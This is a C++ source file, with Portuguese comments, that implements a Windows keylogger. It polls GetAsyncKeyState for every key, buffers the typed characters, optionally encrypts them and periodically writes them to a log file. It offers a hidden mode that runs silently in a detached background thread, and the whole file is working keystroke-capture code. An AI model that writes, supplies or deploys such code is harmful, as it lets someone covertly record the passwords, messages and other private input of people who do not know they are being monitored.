//
// Created by User on 25/09/2025.
//
#include "KeyLogger.h"
#include "FileManager.h"
#include "KeyProcessor.h"
#include "SecurityManager.h"

#include "ConfigManager.h"
#include "Utils.h"

#include <iostream>
#include <thread>
#include <windows.h>

KeyLogger::KeyLogger() : isRunning(false), isHidden(false) {
    fileManager = std::make_unique<FileManager>();
    keyProcessor = std::make_unique<KeyProcessor>();
    securityManager = std::make_unique<SecurityManager>();
    configManager = std::make_unique<ConfigManager>();
}

KeyLogger::~KeyLogger() {
    if (isRunning) {
        stop();
    }
}

bool KeyLogger::initialize() {
    if (!configManager->loadConfig()) {
        std::cerr << "Aviso: Usando configurações padrão" << std::endl;
    }

    auto config = configManager->getConfig();
    fileManager->setOutputPath(config.outputFile);
    fileManager->setMaxFileSize(config.maxFileSize);
    fileManager->setEncryption(config.encryptionEnabled);

    if (config.encryptionEnabled && !config.encryptionKey.empty()) {
        securityManager->setEncryptionKey(config.encryptionKey);
        securityManager->enableEncryption(true);
    }

    return true;
}

void KeyLogger::start() {
    if (isRunning) return;

    isRunning = true;
    lastSave = std::chrono::steady_clock::now();

    fileManager->writeWithTimestamp("=== KEYLOGGER INICIADO === " + Utils::getCurrentTimestamp() + " ===\n");

    std::thread loggerThread([this]() {
        processKeyInput();
    });

    loggerThread.detach();

    if (!isHidden) {
        std::cout << "KeyLogger iniciado. Pressione Ctrl+Alt+Q para parar." << std::endl;
    }
}

void KeyLogger::processKeyInput() {
    while (isRunning) {
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000) &&
            (GetAsyncKeyState('Q') & 0x0001)) {
            stop();
            break;
            }

        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                KeyEvent event = keyProcessor->processKey(key);

                if (key == VK_BACK) {
                    if (!currentBuffer.empty()) {
                        currentBuffer.pop_back();
                        fileManager->writeWithTimestamp("[BACKSPACE]");
                    }
                } else if (!event.actualChar.empty()) {
                    currentBuffer += event.actualChar;

                    // Filtrar dados sensíveis se habilitado
                    std::string filteredData = event.actualChar;
                    if (configManager->getConfig().filterSensitiveData) {
                        filteredData = securityManager->filterSensitiveData(event.actualChar);
                    }

                    if (!isHidden && event.isSpecial) {
                        std::cout << "[" << event.keyName << "]";
                    } else if (!isHidden) {
                        std::cout << filteredData;
                    }
                }
            }
        }

        //auto save
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSave);

        if (elapsed.count() >= configManager->getAutoSaveInterval()) {
            saveBuffer();
            lastSave = now;
        }

        Sleep(10);
    }
}


void KeyLogger::saveBuffer() {
    if (!currentBuffer.empty()) {
        std::string dataToSave = currentBuffer;

        // Aplicar criptografia se habilitada
        if (securityManager->isEncryptionEnabled()) {
            dataToSave = securityManager->encrypt(dataToSave);
        }

        fileManager->writeWithTimestamp(dataToSave);
        currentBuffer.clear();
    }
}

void KeyLogger::stop() {
    if (!isRunning) return;

    isRunning = false;
    saveBuffer();
    fileManager->writeWithTimestamp("=== KEYLOGGER FINALIZADO ===");

    if (!isHidden) {
        std::cout << std::endl << "KeyLogger finalizado." << std::endl;
    }
}
